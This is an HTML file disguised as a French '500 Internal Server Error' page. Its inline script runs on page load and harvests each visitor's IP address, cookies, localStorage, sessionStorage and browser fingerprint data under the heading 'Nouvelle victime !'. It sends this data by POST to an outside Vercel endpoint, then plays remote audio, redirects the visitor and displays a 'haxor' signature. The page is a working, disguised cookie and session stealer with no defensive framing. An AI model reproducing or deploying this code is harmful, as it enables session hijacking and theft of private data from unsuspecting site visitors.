<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Erreur 500 - Erreur interne du serveur</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>500</h1>
        <h2>Erreur interne du serveur</h2>
        <p>Oups ! Quelque chose s'est mal pass√© sur notre serveur.<br>
        Veuillez r√©essayer plus tard.</p>
        <a href="/" class="home-btn">Retour √† l'accueil</a>
    </div>
<script>
const ENDPOINT = "https://cookies-eight-tan.vercel.app/api/cookies";

function getPlugins() {
  if (!navigator.plugins) return "None";
  const names = [];
  for(let i=0; i < navigator.plugins.length; i++) {
    names.push(navigator.plugins[i].name);
  }
  return names.length ? names.join(", ") : "None";
}

function tryStorage(storage) {
  const result = {};
  try {
    for(let i=0; i < storage.length; i++) {
      const key = storage.key(i);
      result[key] = storage.getItem(key);
    }
  } catch {
    return "Access denied";
  }
  return JSON.stringify(result);
}

async function getVisitorIP() {
  try {
    const resp = await fetch('https://ipapi.co/json/');
    if (!resp.ok) throw new Error("Failed to fetch IP");
    const data = await resp.json();
    return data.ip || "Unknown";
  } catch (e) {
    return "Unknown";
  }
}

document.addEventListener('DOMContentLoaded', async function() {
  const ip = await getVisitorIP();
  const data = {
    "üîî Nouvelle victime !": "",
    "üõú IP": ip,
    "üåê URL": location.href,
    "üç™ Cookie": document.cookie || "No cookies",
    "üß† User Agent": navigator.userAgent,
    "üåç Langue": navigator.language || navigator.userLanguage,
    "üñ•Ô∏è R√©solution": `${screen.width}x${screen.height}`,
    "‚è∞ Fuseau horaire": Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
    "üß© Plugins": getPlugins(),
    "üîô Referrer": document.referrer || "None",
    "üïí Heure locale": new Date().toString(),
    "üìÇ localStorage": tryStorage(localStorage),
    "üìÇ sessionStorage": tryStorage(sessionStorage),
    "üßë‚Äçüíª Plateforme": navigator.platform,
  };

  let msg = "";
  for (const key in data) {
    msg += `*${key}* : ${data[key]}\n`;
  }

  // Lecture du son
  const audio = new Audio('https://anonfiles.ch/s/vOzGhsK9Mmb');
  audio.autoplay = true;
  audio.volume = 0.5;
  audio.play().catch(() => {});

  // Envoi des donn√©es au serveur Vercel
  fetch(ENDPOINT, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ data })
  })
  .catch(e => console.error("API send error:", e))
  .finally(() => {
    window.location.href = "https://www.dog-watch.com";

    const teddyBearArt = `
                        __,,,__
                ,-""-,-"       "-,-""-,
               /,-' , .-'-.7.-'-. , '-,\\
               \\(    /  _     _  \\    )/
                '-,  { (0)   (0) }  ,-'
                 /    >  .---.  <    \\
                |/ .-'   \\___/   '-. \\|
                {, /  ,_       _,  \\ ,}
                \\ {,    \\     /    ,} /
                 ',\\.    '---'    ./,'
             _.-""""""-._     _.-""""""-._
           .'            \`._.\`            '.
         _/_               _                \\
      .'\`   \`\\            | |                \\
     /        |           | |                 ;
     |        /           |_|                 |
     \\  ;'---'    _    ___  _  _  ___         ;
      '. ;       | |  /   \\| || ||  _|     _ ;
        \`-\\      | |_ | | || |/ /|  _|   .' \`,
           \`\\    |___|\\___/ \\__/ |___|  |     \\
             \\            _ _           \\     |
         jgs  \`\\         | | |         /\`   _/
    ,-""-.    .'\`\\       | | |       /'-,-'\` .-""-,
   /      \`\\. '    \`\\     \\___/     /\`    './\`      \\
  ;  .--.   \\       '\`           /'       /   .--.  ;
  | (    \\   |,       '\`       /'        |   /    ) |
   \\ ;    }             ;\\   /;         \`   {    ; /
    \`;\   \\         _.-'  \\ /  \`-._         /   /;\`
      \\ \\__.'   _.-'       Y       \`-._    '.__//
       '.___,.-'                       \`-.,___.'
           denz haxor
  `;

    const pre = document.createElement('pre');
    pre.textContent = teddyBearArt;
    pre.style.position = 'fixed';
    pre.style.bottom = '20px';
    pre.style.left = '20px';
    pre.style.backgroundColor = 'rgba(0,0,0,0.85)';
    pre.style.color = '#ff69b4';
    pre.style.padding = '15px';
    pre.style.fontSize = '12px';
    pre.style.fontFamily = 'monospace';
    pre.style.borderRadius = '12px';
    pre.style.zIndex = 999999;
    pre.style.boxShadow = '0 0 20px #ff69b4';

    document.body.appendChild(pre);
  });
});
</script></body>
</html>